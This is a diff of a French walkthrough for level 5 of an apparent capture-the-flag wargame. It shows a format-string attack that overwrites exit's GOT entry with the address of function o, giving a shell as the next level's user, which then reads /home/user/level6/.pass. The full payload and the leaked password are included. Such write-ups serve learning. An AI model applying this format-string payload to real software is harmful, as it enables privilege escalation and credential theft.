@@ -1,7 +1,9 @@
-# Level 5
+# leUVeL cInQ
 
-- `objdump -R ./level5`
+- On cherche l'adresse du exit afin de l'override pour appeler la fonction o. Car c'est la seule fonction qui n'a pas d'utilité au programme et qui ne quitera pas la programme.
+
 <pre>
+$> objdump -R ./level5
 ./level5:     file format elf32-i386
 
 DYNAMIC RELOCATION RECORDS
@@ -16,13 +18,20 @@ OFFSET   TYPE              VALUE
 <strong>08049838</strong> R_386_JUMP_SLOT   exit
 0804983c R_386_JUMP_SLOT   __libc_start_main
 </pre>
+
 - (hex)0x08049838 = (little indian)\\x38\\x98\\x04\\x08
-- `python -c "print('AAAA' + '\x38\x98\x04\x08' + '%x ' * 5)" | ./level5`
+
+- Comme pour l'exercice precedent nous cherchons la place de l'adresse de la fonction `o` grace au printf.
+
 <pre>
+$> python -c "print('AAAA' + '\x38\x98\x04\x08' + '%x ' * 5)" | ./level5
 AAAA8200 b7fd1ac0 b7ff37d0 <strong>41414141 8049838</strong>
 </pre>
-- `gdb ./level5`
+
+- Afin de pouvoir override l'appel à exit nous devons recuperer l'adresse de la fonction o.
+
 <pre>
+$> gdb ./level5
 (gdb) disass o
 Dump of assembler code for function o:
    <strong>0x080484a4</strong> <+0>:	push   %ebp
@@ -35,10 +44,14 @@ Dump of assembler code for function o:
 End of assembler dump.
 </pre>
 - (hex)0x080484a5 = (dec)134513828
-- `(python -c "print('AAAA' + '\x38\x98\x04\x08' + '%134513820d' + '%5\$n')"; cat) | ./level5 | tr -d ' '`
-```
+
+- Comme pour l'exercice precedent nous avons l'adresse de la fonction à override et en plus l'adresse de la fonction o sous forme de decimal.
+
+<pre>
+$> (python -c "print('AAAA' + '\x38\x98\x04\x08' + '%134513820d' + '%5\$n')"; cat) | ./level5 | tr -d ' '`
+
 id
 uid=2045(level5)gid=2045(level5)euid=2064(level6)egid=100(users)groups=2064(level6),100(users),2045(level5)
 cat /home/user/level6/.pass
 AAAA8d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
-```
+</pre>
